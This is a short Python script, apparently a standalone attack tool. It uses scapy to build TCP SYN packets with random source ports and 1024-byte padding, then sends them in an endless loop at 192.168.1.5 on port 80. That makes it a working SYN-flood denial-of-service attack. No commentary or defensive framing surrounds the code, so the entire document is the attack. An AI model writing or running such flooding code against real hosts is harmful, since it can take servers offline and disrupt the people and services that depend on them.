import sys,os
from scapy.all import *
import threading
target='192.168.1.5'
port=80
ip=IP(dst=target)
tcp=TCP(sport=RandShort(),dport=port,flags="S")
raw=Raw(b"X"*1024)
packets=ip/tcp/raw
send(packets,loop=1,verbose=0)